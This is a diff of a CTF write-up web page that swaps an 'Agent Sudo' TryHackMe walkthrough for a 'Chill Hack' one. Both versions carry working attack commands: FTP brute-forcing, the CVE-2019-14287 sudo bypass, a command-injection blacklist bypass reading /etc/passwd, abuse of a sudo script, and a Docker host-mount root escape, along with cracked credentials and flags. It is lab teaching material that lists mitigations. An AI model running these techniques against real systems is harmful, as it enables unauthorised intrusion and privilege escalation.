@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>CTF Writeup: Agent Sudo | 0xb0rn3</title>
+    <title>CTF Writeup: Chill Hack | 0xb0rn3</title>
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css">
     <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@700;900&family=JetBrains+Mono:wght@300;400;500;600;700&family=IBM+Plex+Mono:wght@300;400;500;600;700&display=swap" rel="stylesheet">
     <style>
@@ -610,29 +610,29 @@
             <div class="nav-right">
                 <a href="index.html" class="nav-btn"><i class="fas fa-home"></i>Home</a>
                 <a href="CTF.html" class="nav-btn"><i class="fas fa-trophy"></i>All CTFs</a>
-                <a href="https://github.com/0xb0rn3/CTFS/tree/main/THM/Agent_Sudo" target="_blank" class="nav-btn"><i class="fab fa-github"></i>Repo</a>
+                <a href="https://github.com/0xb0rn3/CTFS/tree/main/THM/Chill_Hack" target="_blank" class="nav-btn"><i class="fab fa-github"></i>Repo</a>
             </div>
         </div>
     </nav>
 
     <header class="hero">
         <div class="hero-tag"><span class="pulse"></span>CTF Writeup</div>
-        <h1 class="hero-title">Agent <span class="accent">Sudo</span></h1>
-        <p class="hero-sub">TryHackMe &middot; Stego / CVE-2019-14287 &middot; Easy &middot; by 0xb0rn3</p>
+        <h1 class="hero-title">Chill <span class="accent">Hack</span></h1>
+        <p class="hero-sub">TryHackMe &middot; Boot2Root &middot; Medium &middot; by 0xb0rn3</p>
 
         <div class="meta-grid">
             <span class="meta-key">Platform</span>  <span class="meta-val">TryHackMe</span>
-            <span class="meta-key">Category</span>  <span class="meta-val">Steganography / User-Agent Abuse / Sudo CVE</span>
-            <span class="meta-key">Difficulty</span> <span class="meta-val severity">Easy</span>
-            <span class="meta-key">Target</span>     <span class="meta-val"><code>10.49.129.194</code></span>
-            <span class="meta-key">Stack</span>       <span class="meta-val">Apache 2.4.29 / vsftpd 3.0.3 / OpenSSH 7.6p1</span>
-            <span class="meta-key">CVE</span>         <span class="meta-val" style="color:var(--red);font-weight:700;">CVE-2019-14287</span>
+            <span class="meta-key">Category</span>  <span class="meta-val">Boot2Root / Command Injection / Docker Escape</span>
+            <span class="meta-key">Difficulty</span> <span class="meta-val severity" style="color:var(--orange);">Medium</span>
+            <span class="meta-key">Target</span>     <span class="meta-val"><code>10.48.138.143</code></span>
+            <span class="meta-key">Stack</span>       <span class="meta-val">Apache 2.4.41 / vsftpd 3.0.5 / OpenSSH 8.2p1 / MySQL / Docker</span>
+            <span class="meta-key">Flags</span>       <span class="meta-val flag">2 flags captured</span>
         </div>
     </header>
 
     <main class="writeup">
 
-        <!-- STEP 0 -->
+        <!-- OVERVIEW -->
         <section class="writeup-section">
             <div class="step-header">
                 <div class="step-num">0</div>
@@ -642,11 +642,11 @@
                 </div>
             </div>
             <p>
-                A secret server hidden in the deep sea. The mission: abuse HTTP User-Agent sniffing
-                to discover a hidden page, chain FTP credentials + ZIP cracking + steganography to
-                exfil SSH credentials, land a shell as <code>james</code>, then exploit
-                <strong>CVE-2019-14287</strong> (sudo <code>!root</code> bypass) to pop root.
-                Multi-layered chain with stego, crypto, and a real-world CVE.
+                Full compromise chained through: anonymous FTP intel &rarr; web command injection
+                with blacklist bypass &rarr; sudo misconfiguration (www-data &rarr; apaar) &rarr;
+                MySQL credential extraction &rarr; steganography (backup.zip hidden in JPEG) &rarr;
+                base64-encoded SSH password &rarr; Docker group privilege escalation to root.
+                Four lateral moves, three users, one clean chain.
             </p>
 
             <div class="code-block">
@@ -654,27 +654,27 @@
                     <span class="code-lang">ATTACK CHAIN</span>
                     <button class="code-copy" onclick="copyCode(this)">Copy</button>
                 </div>
-<pre>nmap &rarr; 21/FTP, 22/SSH, 80/HTTP
+<pre>Anonymous FTP &rarr; note.txt hints at command filtering
   &darr;
-User-Agent: C &rarr; agent_C_attention.php &rarr; username "chris"
+Web /secret/ POST command= &rarr; www-data RCE (blacklist bypass)
   &darr;
-hydra FTP brute-force &rarr; chris:crystal
+sudo -u apaar .helpline.sh &rarr; command injection via $msg
   &darr;
-FTP files: cutie.png (embedded ZIP) + cute-alien.jpg (steghide)
+user flag: {USER-FLAG: e8vpd3323cfvlp0qpxxx9qtr5iq37oww}
   &darr;
-ZIP crack &rarr; "alien" &rarr; Base64 decode &rarr; "Area51"
+/var/www/files/index.php &rarr; MySQL root creds &rarr; MD5 hashes
   &darr;
-steghide extract &rarr; james:hackerrules!
+steghide JPEG &rarr; backup.zip (pass1word) &rarr; base64 password
   &darr;
-SSH as james &rarr; user flag: b03d975e8c92a7c04146cfa7a5a313c7
+SSH as anurodh (docker group)
   &darr;
-CVE-2019-14287: sudo -u#-1 /bin/bash &rarr; root
+docker run -v /:/host alpine &rarr; root flag
   &darr;
-root flag: b53a02f55b57d4439e3341834d70c062</pre>
+root flag: {ROOT-FLAG: w18gfpn9xehsgd3tovhk0hby4gdp89bg}</pre>
             </div>
         </section>
 
-        <!-- STEP 1 -->
+        <!-- STEP 1 &mdash; RECON -->
         <section class="writeup-section">
             <div class="step-header">
                 <div class="step-num">1</div>
@@ -689,7 +689,7 @@ root flag: b53a02f55b57d4439e3341834d70c062</pre>
                     <span class="code-lang">BASH</span>
                     <button class="code-copy" onclick="copyCode(this)">Copy</button>
                 </div>
-<pre><span class="cmd-p">$</span> nmap -sV -sC -T4 -p- --min-rate 3000 -Pn 10.49.129.194</pre>
+<pre><span class="cmd-p">$</span> nmap -sV -sC -T4 -p- --min-rate 3000 -Pn 10.48.138.143</pre>
             </div>
 
             <div class="vuln-table-wrap">
@@ -698,198 +698,99 @@ root flag: b53a02f55b57d4439e3341834d70c062</pre>
                         <tr><th>Port</th><th>Service</th><th>Version</th><th>Notes</th></tr>
                     </thead>
                     <tbody>
-                        <tr><td><code>21/tcp</code></td><td>FTP</td><td>vsftpd 3.0.3</td><td>Brute-force target</td></tr>
-                        <tr><td><code>22/tcp</code></td><td>SSH</td><td>OpenSSH 7.6p1</td><td>Final access vector</td></tr>
-                        <tr><td><code>80/tcp</code></td><td>HTTP</td><td>Apache 2.4.29</td><td style="color:var(--red);">User-Agent sniffing</td></tr>
+                        <tr><td><code>21/tcp</code></td><td>FTP</td><td>vsftpd 3.0.5</td><td style="color:var(--red);">Anonymous login allowed</td></tr>
+                        <tr><td><code>22/tcp</code></td><td>SSH</td><td>OpenSSH 8.2p1</td><td>Final access vector</td></tr>
+                        <tr><td><code>80/tcp</code></td><td>HTTP</td><td>Apache 2.4.41</td><td>Command execution panel at /secret/</td></tr>
                     </tbody>
                 </table>
             </div>
-
-            <p>Three open ports. The web server holds the first clue.</p>
         </section>
 
-        <!-- STEP 2 -->
+        <!-- STEP 2 &mdash; FTP -->
         <section class="writeup-section">
             <div class="step-header">
                 <div class="step-num">2</div>
                 <div>
-                    <div class="step-label">Web Enumeration</div>
-                    <h2 class="step-title">User-Agent Sniffing &mdash; Agent C</h2>
+                    <div class="step-label">Enumeration</div>
+                    <h2 class="step-title">FTP &mdash; Anonymous Access</h2>
                 </div>
-            </div>
-
-            <p>The landing page instructs agents to use their codename as the User-Agent header:</p>
-
-            <div class="code-block">
-                <div class="code-bar">
-                    <span class="code-lang">BASH</span>
-                    <button class="code-copy" onclick="copyCode(this)">Copy</button>
-                </div>
-<pre><span class="cmd-p">$</span> for letter in {A..Z}; do
-    wget -S -O /dev/null --header="User-Agent: $letter" http://10.49.129.194/ 2&gt;&amp;1 | grep "Location:"
-done
-
-<span class="out-line" style="color:var(--aqua);font-weight:600;">  Location: agent_C_attention.php  [Agent C triggers 302 redirect]</span></pre>
             </div>
 
             <div class="code-block">
                 <div class="code-bar">
-                    <span class="code-lang">agent_C_attention.php</span>
+                    <span class="code-lang">note.txt</span>
                     <button class="code-copy" onclick="copyCode(this)">Copy</button>
                 </div>
-<pre><span class="out-line" style="color:var(--orange);">Attention chris,</span>
-<span class="out-line" style="color:var(--orange);">Do you still remember our deal? Please tell agent J about the stuff ASAP.</span>
-<span class="out-line" style="color:var(--orange);">Also, change your god damn password, is weak!</span>
-<span class="out-line" style="color:var(--orange);">From, Agent R</span></pre>
+<pre><span class="out-line" style="color:var(--orange);">Anurodh told me that there is some filtering on strings</span>
+<span class="out-line" style="color:var(--orange);">being put in the command -- Apaar</span></pre>
             </div>
 
-            <p>Agent C&rsquo;s real name: <code>chris</code> &mdash; with a confirmed weak password.</p>
+            <p>
+                Key intel: a command execution panel exists with string-based filtering.
+                Two usernames leaked: <code>Anurodh</code> and <code>Apaar</code>.
+            </p>
         </section>
 
-        <!-- STEP 3 -->
+        <!-- STEP 3 &mdash; COMMAND INJECTION -->
         <section class="writeup-section">
             <div class="step-header">
                 <div class="step-num">3</div>
                 <div>
                     <div class="step-label">Exploitation</div>
-                    <h2 class="step-title">FTP Brute-Force &amp; File Extraction</h2>
+                    <h2 class="step-title">Command Injection &mdash; Blacklist Bypass</h2>
                 </div>
             </div>
+
+            <p>
+                Directory brute-force reveals <code>/secret/</code> &mdash; a POST-based command execution
+                form. Reading the PHP source exposes the blacklist:
+            </p>
 
             <div class="code-block">
                 <div class="code-bar">
-                    <span class="code-lang">BASH</span>
+                    <span class="code-lang">PHP &mdash; BLACKLIST</span>
                     <button class="code-copy" onclick="copyCode(this)">Copy</button>
                 </div>
-<pre><span class="cmd-p">$</span> hydra -l chris -P /tmp/rockyou.txt ftp://10.49.129.194 -t 10 -f
-
-<span class="out-line" style="color:var(--aqua);font-weight:700;">[21][ftp] host: 10.49.129.194   login: chris   password: crystal</span></pre>
+<pre>$blacklist = array('nc','python','bash','php','perl','rm','cat',
+                   'head','tail','python3','more','less','sh','ls');</pre>
             </div>
 
-            <p>Three files downloaded via FTP:</p>
+            <p>
+                The filter splits by <strong>spaces</strong> and checks each word. Bypass by using
+                full binary paths:
+            </p>
 
             <div class="vuln-table-wrap">
                 <table class="vuln-table">
                     <thead>
-                        <tr><th>File</th><th>Purpose</th></tr>
+                        <tr><th>Blocked</th><th>Bypass</th></tr>
                     </thead>
                     <tbody>
-                        <tr><td><code>To_agentJ.txt</code></td><td>Hint: password hidden inside one of the images</td></tr>
-                        <tr><td><code>cutie.png</code></td><td>Contains embedded AES-encrypted ZIP archive</td></tr>
-                        <tr><td><code>cute-alien.jpg</code></td><td>Contains steghide-embedded SSH credentials</td></tr>
+                        <tr><td><code>ls</code></td><td><code>/bin/ls</code> or <code>l$@s</code></td></tr>
+                        <tr><td><code>cat</code></td><td><code>/bin/cat</code></td></tr>
+                        <tr><td><code>python3</code></td><td><code>/usr/bin/python3</code></td></tr>
+                        <tr><td><code>bash</code></td><td><code>/bin/bash</code></td></tr>
                     </tbody>
                 </table>
             </div>
+
+            <div class="code-block">
+                <div class="code-bar">
+                    <span class="code-lang">BASH</span>
+                    <button class="code-copy" onclick="copyCode(this)">Copy</button>
+                </div>
+<pre><span class="cmd-p">$</span> curl -X POST http://10.48.138.143/secret/     --data 'command=/bin/cat+/etc/passwd'
+<span class="out-line" style="color:var(--aqua);font-weight:600;">&rarr; Returns /etc/passwd as www-data</span></pre>
+            </div>
         </section>
 
-        <!-- STEP 4 -->
+        <!-- STEP 4 &mdash; WWW-DATA TO APAAR -->
         <section class="writeup-section">
             <div class="step-header">
                 <div class="step-num">4</div>
                 <div>
-                    <div class="step-label">Steganography</div>
-                    <h2 class="step-title">Image &rarr; ZIP &rarr; Base64 &rarr; Steghide &rarr; Creds</h2>
-                </div>
-            </div>
-
-            <p><strong>Layer 1:</strong> Extract embedded ZIP from <code>cutie.png</code></p>
-
-            <div class="code-block">
-                <div class="code-bar">
-                    <span class="code-lang">BASH</span>
-                    <button class="code-copy" onclick="copyCode(this)">Copy</button>
-                </div>
-<pre><span class="cmd-p">$</span> zsteg cutie.png
-<span class="out-line">extradata:0  .. file: Zip archive data (AES Encrypted)</span>
-<span class="out-line">             Contents: To_agentR.txt</span>
-
-<span class="cmd-p">$</span> dd if=cutie.png bs=1 skip=34562 of=hidden.zip</pre>
-            </div>
-
-            <p><strong>Layer 2:</strong> Crack the ZIP password</p>
-
-            <div class="code-block">
-                <div class="code-bar">
-                    <span class="code-lang">BASH</span>
-                    <button class="code-copy" onclick="copyCode(this)">Copy</button>
-                </div>
-<pre><span class="cmd-p">$</span> zip2john hidden.zip &gt; hash.txt
-<span class="cmd-p">$</span> john hash.txt --format=ZIP --wordlist=/tmp/rockyou.txt
-
-<span class="out-line" style="color:var(--aqua);font-weight:600;">alien            (hidden.zip/To_agentR.txt)</span>
-
-<span class="cmd-p">$</span> 7z x -palien hidden.zip</pre>
-            </div>
-
-            <p><strong>Layer 3:</strong> Decode the Base64 string</p>
-
-            <div class="code-block">
-                <div class="code-bar">
-                    <span class="code-lang">BASH</span>
-                    <button class="code-copy" onclick="copyCode(this)">Copy</button>
-                </div>
-<pre><span class="cmd-p">$</span> cat To_agentR.txt
-<span class="out-line">We need to send the picture to 'QXJlYTUx' as soon as possible!</span>
-
-<span class="cmd-p">$</span> echo "QXJlYTUx" | base64 -d
-<span class="out-line" style="color:var(--aqua);font-weight:600;">Area51</span></pre>
-            </div>
-
-            <p><strong>Layer 4:</strong> Extract SSH creds from <code>cute-alien.jpg</code></p>
-
-            <div class="code-block">
-                <div class="code-bar">
-                    <span class="code-lang">BASH</span>
-                    <button class="code-copy" onclick="copyCode(this)">Copy</button>
-                </div>
-<pre><span class="cmd-p">$</span> steghide extract -sf cute-alien.jpg -p "Area51"
-<span class="out-line">wrote extracted data to "message.txt"</span>
-
-<span class="cmd-p">$</span> cat message.txt
-<span class="out-line" style="color:var(--orange);">Hi james,</span>
-<span class="out-line" style="color:var(--orange);">Your login password is hackerrules!</span></pre>
-            </div>
-
-            <p>Four layers deep: PNG &rarr; ZIP &rarr; Base64 &rarr; steghide &rarr; <code>james:hackerrules!</code></p>
-        </section>
-
-        <!-- STEP 5 -->
-        <section class="writeup-section">
-            <div class="step-header">
-                <div class="step-num">5</div>
-                <div>
-                    <div class="step-label">Initial Access</div>
-                    <h2 class="step-title">SSH &mdash; User Shell &amp; Flag</h2>
-                </div>
-            </div>
-
-            <div class="code-block">
-                <div class="code-bar">
-                    <span class="code-lang">BASH</span>
-                    <button class="code-copy" onclick="copyCode(this)">Copy</button>
-                </div>
-<pre><span class="cmd-p">$</span> ssh james@10.49.129.194
-<span class="out-line">Password: hackerrules!</span>
-
-<span class="cmd-p">$</span> cat ~/user_flag.txt
-<span class="out-line" style="color:var(--aqua);font-weight:600;">b03d975e8c92a7c04146cfa7a5a313c7</span></pre>
-            </div>
-
-            <div class="flag-banner">
-                <div class="flag-label"><i class="fas fa-flag"></i> &nbsp;User Flag</div>
-                <div class="flag-value">b03d975e8c92a7c04146cfa7a5a313c7</div>
-            </div>
-
-            <p>Home directory also contains <code>Alien_autospy.jpg</code> &mdash; depicting the <strong>Roswell alien autopsy</strong> (1947/1995).</p>
-        </section>
-
-        <!-- STEP 6 -->
-        <section class="writeup-section">
-            <div class="step-header">
-                <div class="step-num">6</div>
-                <div>
                     <div class="step-label">Privilege Escalation</div>
-                    <h2 class="step-title">CVE-2019-14287 &mdash; sudo !root Bypass</h2>
+                    <h2 class="step-title">www-data &rarr; apaar &mdash; .helpline.sh Injection</h2>
                 </div>
             </div>
 
@@ -899,44 +800,143 @@ done
                     <button class="code-copy" onclick="copyCode(this)">Copy</button>
                 </div>
 <pre><span class="cmd-p">$</span> sudo -l
-<span class="out-line">User james may run the following commands:</span>
-<span class="out-line" style="color:var(--red);font-weight:700;">    (ALL, !root) /bin/bash</span></pre>
+<span class="out-line">(apaar : ALL) NOPASSWD: /home/apaar/.helpline.sh</span></pre>
             </div>
 
             <p>
-                The rule intends to let james run <code>/bin/bash</code> as any user <em>except</em> root.
-                However, <strong>CVE-2019-14287</strong> (sudo &lt; 1.8.28) allows bypassing the
-                <code>!root</code> restriction by specifying UID <code>-1</code>, which sudo
-                incorrectly resolves to UID 0 (root).
+                The script reads user input into <code>$msg</code> and <strong>executes it directly</strong>:
             </p>
 
-            <div class="meta-grid" style="margin: .8rem 0;">
-                <span class="meta-key">CVE</span>      <span class="meta-val" style="color:var(--red);font-weight:700;">CVE-2019-14287</span>
-                <span class="meta-key">Affected</span>  <span class="meta-val">sudo &lt; 1.8.28</span>
-                <span class="meta-key">Type</span>      <span class="meta-val">Authorization Bypass via Numeric UID Overflow</span>
-                <span class="meta-key">Vector</span>    <span class="meta-val"><code>sudo -u#-1 /bin/bash</code></span>
+            <div class="code-block">
+                <div class="code-bar">
+                    <span class="code-lang">.helpline.sh (vulnerable)</span>
+                    <button class="code-copy" onclick="copyCode(this)">Copy</button>
+                </div>
+<pre>read -p "Enter the person..." person
+read -p "Hello user! I am $person, Please enter your message: " msg
+<span style="color:var(--red);font-weight:700;">$msg 2>/dev/null</span>   # &larr; direct command execution</pre>
             </div>
+
+            <div class="code-block">
+                <div class="code-bar">
+                    <span class="code-lang">BASH &mdash; EXPLOIT</span>
+                    <button class="code-copy" onclick="copyCode(this)">Copy</button>
+                </div>
+<pre><span class="cmd-p">$</span> printf "x
+/bin/cp /home/apaar/local.txt /tmp/uf.txt
+" |     sudo -u apaar /home/apaar/.helpline.sh
+<span class="cmd-p">$</span> printf "x
+/bin/chmod 777 /tmp/uf.txt
+" |     sudo -u apaar /home/apaar/.helpline.sh
+<span class="cmd-p">$</span> /bin/cat /tmp/uf.txt
+<span class="out-line" style="color:var(--aqua);font-weight:600;">{USER-FLAG: e8vpd3323cfvlp0qpxxx9qtr5iq37oww}</span></pre>
+            </div>
+
+            <div class="flag-banner">
+                <div class="flag-label"><i class="fas fa-flag"></i> &nbsp;User Flag</div>
+                <div class="flag-value">{USER-FLAG: e8vpd3323cfvlp0qpxxx9qtr5iq37oww}</div>
+            </div>
+        </section>
+
+        <!-- STEP 5 &mdash; LATERAL MOVEMENT -->
+        <section class="writeup-section">
+            <div class="step-header">
+                <div class="step-num">5</div>
+                <div>
+                    <div class="step-label">Lateral Movement</div>
+                    <h2 class="step-title">MySQL &rarr; Stego &rarr; SSH as anurodh</h2>
+                </div>
+            </div>
+
+            <p><strong>Phase 1 &mdash; MySQL credentials in web source:</strong></p>
+
+            <div class="code-block">
+                <div class="code-bar">
+                    <span class="code-lang">/var/www/files/index.php</span>
+                    <button class="code-copy" onclick="copyCode(this)">Copy</button>
+                </div>
+<pre>$con = new PDO("mysql:dbname=webportal;host=localhost",
+               <span style="color:var(--red);font-weight:700;">"root"</span>, <span style="color:var(--red);font-weight:700;">"!@m+her00+@db"</span>);</pre>
+            </div>
+
+            <div class="code-block">
+                <div class="code-bar">
+                    <span class="code-lang">MySQL</span>
+                    <button class="code-copy" onclick="copyCode(this)">Copy</button>
+                </div>
+<pre><span class="cmd-p">$</span> mysql -u root -p"!@m+her00+@db" webportal -e "SELECT * FROM users;"
+
+<span class="out-line">id  username     password (MD5)</span>
+<span class="out-line">1   Aurick       7e53614ced3640d5de23f111806cc4fd  &rarr; masterpassword</span>
+<span class="out-line">2   cullapaar    686216240e5af30df0501e53c789a649  &rarr; dontaskdonttell</span></pre>
+            </div>
+
+            <p><strong>Phase 2 &mdash; Steganography &rarr; backup.zip:</strong></p>
 
             <div class="code-block">
                 <div class="code-bar">
                     <span class="code-lang">BASH</span>
                     <button class="code-copy" onclick="copyCode(this)">Copy</button>
                 </div>
-<pre><span class="cmd-p">$</span> sudo -u#-1 /bin/bash
+<pre><span class="cmd-p">$</span> steghide extract -sf hacker-with-laptop_23-2147985341.jpg -p ""
+<span class="out-line">wrote extracted data to "backup.zip"</span>
 
-<span class="out-line" style="color:var(--red);font-weight:700;">root@agent-sudo:~#</span> id
-<span class="out-line">uid=0(root) gid=1000(james) groups=1000(james)</span>
+<span class="cmd-p">$</span> zip2john backup.zip &gt; zip.hash
+<span class="cmd-p">$</span> john zip.hash --wordlist=rockyou.txt
+<span class="out-line" style="color:var(--aqua);font-weight:600;">pass1word        (backup.zip)</span>
 
-<span class="cmd-p">#</span> cat /root/root.txt
-<span class="out-line" style="color:var(--aqua);font-weight:600;">b53a02f55b57d4439e3341834d70c062</span></pre>
+<span class="cmd-p">$</span> unzip -P pass1word backup.zip</pre>
+            </div>
+
+            <p><strong>Phase 3 &mdash; Base64 password in source_code.php:</strong></p>
+
+            <div class="code-block">
+                <div class="code-bar">
+                    <span class="code-lang">BASH</span>
+                    <button class="code-copy" onclick="copyCode(this)">Copy</button>
+                </div>
+<pre><span class="cmd-p">$</span> echo "IWQwbnRLbjB3bVlwQHNzdzByZA==" | base64 -d
+<span class="out-line" style="color:var(--aqua);font-weight:600;">!d0ntKn0wmYp@ssw0rd</span>
+
+<span class="cmd-p">$</span> ssh anurodh@10.48.138.143
+<span class="out-line">Password: !d0ntKn0wmYp@ssw0rd</span>
+<span class="out-line" style="color:var(--aqua);">uid=1002(anurodh) gid=1002(anurodh) groups=1002(anurodh),<span style="color:var(--red);font-weight:700;">999(docker)</span></span></pre>
+            </div>
+
+            <p>The <code>docker</code> group membership is the key to root.</p>
+        </section>
+
+        <!-- STEP 6 &mdash; DOCKER ROOT -->
+        <section class="writeup-section">
+            <div class="step-header">
+                <div class="step-num">6</div>
+                <div>
+                    <div class="step-label">Privilege Escalation</div>
+                    <h2 class="step-title">Docker Group &rarr; Root</h2>
+                </div>
+            </div>
+
+            <p>
+                Docker group membership is equivalent to root. Mount the host filesystem
+                into a container and read anything:
+            </p>
+
+            <div class="code-block">
+                <div class="code-bar">
+                    <span class="code-lang">BASH</span>
+                    <button class="code-copy" onclick="copyCode(this)">Copy</button>
+                </div>
+<pre><span class="cmd-p">$</span> docker images
+<span class="out-line">alpine   latest   a24bb4013296   5 years ago   5.57MB</span>
+
+<span class="cmd-p">$</span> docker run --rm -v /:/host alpine /bin/sh -c "cat /host/root/proof.txt"
+<span class="out-line" style="color:var(--aqua);font-weight:600;">{ROOT-FLAG: w18gfpn9xehsgd3tovhk0hby4gdp89bg}</span></pre>
             </div>
 
             <div class="flag-banner">
                 <div class="flag-label"><i class="fas fa-flag"></i> &nbsp;Root Flag</div>
-                <div class="flag-value">b53a02f55b57d4439e3341834d70c062</div>
+                <div class="flag-value">{ROOT-FLAG: w18gfpn9xehsgd3tovhk0hby4gdp89bg}</div>
             </div>
-
-            <p>Agent R&rsquo;s real identity: <strong>DesKel</strong></p>
         </section>
 
         <!-- ATTACK CHAIN -->
@@ -953,38 +953,63 @@ done
                 <div class="chain-step">
                     <div class="chain-dot">1</div>
                     <div class="chain-info">
-                        <div class="chain-label">User-Agent Fuzzing</div>
-                        <div class="chain-detail"><code>User-Agent: C</code> &rarr; reveals username <code>chris</code> with weak password</div>
+                        <div class="chain-label">Anonymous FTP</div>
+                        <div class="chain-detail"><code>note.txt</code> &rarr; confirms command filtering, leaks usernames</div>
                     </div>
                 </div>
                 <div class="chain-step">
                     <div class="chain-dot">2</div>
                     <div class="chain-info">
-                        <div class="chain-label">FTP Brute-Force</div>
-                        <div class="chain-detail">Hydra &rarr; <code>chris:crystal</code> &rarr; 3 files downloaded</div>
+                        <div class="chain-label">Command Injection (www-data)</div>
+                        <div class="chain-detail"><code>/secret/</code> POST form &mdash; blacklist bypassed with full binary paths</div>
                     </div>
                 </div>
                 <div class="chain-step">
                     <div class="chain-dot">3</div>
                     <div class="chain-info">
-                        <div class="chain-label">4-Layer Stego Chain</div>
-                        <div class="chain-detail">PNG &rarr; ZIP (<code>alien</code>) &rarr; Base64 (<code>Area51</code>) &rarr; steghide &rarr; SSH creds</div>
+                        <div class="chain-label">sudo .helpline.sh &rarr; apaar</div>
+                        <div class="chain-detail"><code>$msg</code> executed directly &rarr; <span class="flag-hl">User flag</span></div>
                     </div>
                 </div>
                 <div class="chain-step">
                     <div class="chain-dot">4</div>
                     <div class="chain-info">
-                        <div class="chain-label">SSH as james</div>
-                        <div class="chain-detail"><code>james:hackerrules!</code> &rarr; <span class="flag-hl">User flag: b03d975e8c92a7c04146cfa7a5a313c7</span></div>
+                        <div class="chain-label">MySQL &rarr; Stego &rarr; SSH</div>
+                        <div class="chain-detail">DB creds &rarr; MD5 crack &rarr; steghide &rarr; base64 &rarr; <code>anurodh:!d0ntKn0wmYp@ssw0rd</code></div>
                     </div>
                 </div>
                 <div class="chain-step">
                     <div class="chain-dot final"><i class="fas fa-flag" style="font-size:.5rem"></i></div>
                     <div class="chain-info">
-                        <div class="chain-label">CVE-2019-14287 &rarr; Root</div>
-                        <div class="chain-detail"><code>sudo -u#-1 /bin/bash</code> &rarr; <span class="flag-hl">Root flag: b53a02f55b57d4439e3341834d70c062</span></div>
+                        <div class="chain-label">Docker Group &rarr; Root</div>
+                        <div class="chain-detail"><code>docker run -v /:/host alpine</code> &rarr; <span class="flag-hl">Root flag</span></div>
                     </div>
                 </div>
+            </div>
+        </section>
+
+        <!-- CREDENTIALS -->
+        <section class="writeup-section">
+            <div class="step-header">
+                <div class="step-num"><i class="fas fa-key" style="font-size:.55rem"></i></div>
+                <div>
+                    <div class="step-label">Loot</div>
+                    <h2 class="step-title">Credentials Recovered</h2>
+                </div>
+            </div>
+
+            <div class="vuln-table-wrap">
+                <table class="vuln-table">
+                    <thead>
+                        <tr><th>User</th><th>Password</th><th>Source</th></tr>
+                    </thead>
+                    <tbody>
+                        <tr><td>MySQL root</td><td><code>!@m+her00+@db</code></td><td>/var/www/files/index.php</td></tr>
+                        <tr><td>Aurick (DB)</td><td><code>masterpassword</code></td><td>MySQL MD5 cracked</td></tr>
+                        <tr><td>cullapaar (DB)</td><td><code>dontaskdonttell</code></td><td>MySQL MD5 cracked</td></tr>
+                        <tr><td>anurodh (SSH)</td><td><code>!d0ntKn0wmYp@ssw0rd</code></td><td>backup.zip &rarr; source_code.php base64</td></tr>
+                    </tbody>
+                </table>
             </div>
         </section>
 
@@ -1005,34 +1030,45 @@ done
                     </thead>
                     <tbody>
                         <tr>
-                            <td>CVE-2019-14287 (sudo !root bypass)</td>
-                            <td>sudoers / sudo &lt; 1.8.28</td>
+                            <td>Docker group membership</td>
+                            <td>anurodh user groups</td>
                             <td><span class="sev sev-crit">Critical</span></td>
-                            <td>Full root via UID -1 overflow</td>
+                            <td>Full host root via filesystem mount</td>
                         </tr>
                         <tr>
-                            <td>Hardcoded SSH creds in steganography</td>
-                            <td>cute-alien.jpg</td>
+                            <td>OS command injection (blacklist bypass)</td>
+                            <td><code>/secret/</code> web form</td>
                             <td><span class="sev sev-crit">Critical</span></td>
-                            <td>Direct SSH access as james</td>
+                            <td>RCE as www-data via full binary paths</td>
                         </tr>
                         <tr>
-                            <td>Weak FTP password (chris:crystal)</td>
+                            <td>Unsafe script execution via sudo</td>
+                            <td><code>.helpline.sh</code></td>
+                            <td><span class="sev sev-crit">Critical</span></td>
+                            <td>Arbitrary command exec as apaar</td>
+                        </tr>
+                        <tr>
+                            <td>Hardcoded MySQL root password</td>
+                            <td>/var/www/files/index.php</td>
+                            <td><span class="sev sev-high">High</span></td>
+                            <td>Full database access, credential dump</td>
+                        </tr>
+                        <tr>
+                            <td>Weak MD5 password hashes</td>
+                            <td>MySQL webportal.users</td>
+                            <td><span class="sev sev-high">High</span></td>
+                            <td>Cracked in seconds with rockyou</td></tr>
+                        <tr>
+                            <td>Credentials in steganography + base64</td>
+                            <td>JPEG &rarr; ZIP &rarr; PHP source</td>
+                            <td><span class="sev sev-high">High</span></td>
+                            <td>SSH password recovered via trivial extraction</td>
+                        </tr>
+                        <tr>
+                            <td>Anonymous FTP with sensitive files</td>
                             <td>FTP (21)</td>
-                            <td><span class="sev sev-high">High</span></td>
-                            <td>File download, credential chain starts</td>
-                        </tr>
-                        <tr>
-                            <td>User-Agent based access control</td>
-                            <td>HTTP (80)</td>
-                            <td><span class="sev sev-high">High</span></td>
-                            <td>Username disclosure via header manipulation</td>
-                        </tr>
-                        <tr>
-                            <td>Weak ZIP password (alien)</td>
-                            <td>Embedded in cutie.png</td>
                             <td><span class="sev sev-med">Medium</span></td>
-                            <td>Crackable with rockyou in seconds</td>
+                            <td>Username disclosure, operational intel</td>
                         </tr>
                     </tbody>
                 </table>
@@ -1051,78 +1087,39 @@ done
 
             <div class="takeaway-grid">
                 <div class="takeaway-card">
-                    <div class="takeaway-icon"><i class="fas fa-sync-alt"></i></div>
-                    <div class="takeaway-title">Patch sudo Immediately</div>
+                    <div class="takeaway-icon"><i class="fab fa-docker"></i></div>
+                    <div class="takeaway-title">Docker Group = Root</div>
                     <div class="takeaway-text">
-                        CVE-2019-14287 is trivially exploitable with a single command.
-                        Upgrade to sudo &ge;1.8.28 to eliminate the UID overflow bypass.
+                        Docker group membership grants unrestricted host filesystem access.
+                        Never add unprivileged users to the docker group &mdash; use rootless
+                        Docker or Podman instead.
                     </div>
                 </div>
                 <div class="takeaway-card">
-                    <div class="takeaway-icon"><i class="fas fa-user-secret"></i></div>
-                    <div class="takeaway-title">Never Trust User-Agent for AuthZ</div>
+                    <div class="takeaway-icon"><i class="fas fa-terminal"></i></div>
+                    <div class="takeaway-title">Blacklists Don&rsquo;t Work</div>
                     <div class="takeaway-text">
-                        Client-controlled headers are trivially spoofable. Never use them
-                        for access control decisions.
+                        Command blacklists are trivially bypassed with full paths, variable
+                        expansion, or encoding tricks. Use allowlists or avoid shell execution entirely.
                     </div>
                 </div>
                 <div class="takeaway-card">
-                    <div class="takeaway-icon"><i class="fas fa-image"></i></div>
-                    <div class="takeaway-title">Don&rsquo;t Hide Creds in Images</div>
+                    <div class="takeaway-icon"><i class="fas fa-file-code"></i></div>
+                    <div class="takeaway-title">Audit sudo Scripts</div>
                     <div class="takeaway-text">
-                        Steganography is obscurity, not security. Tools like steghide, zsteg,
-                        and binwalk extract hidden data in seconds.
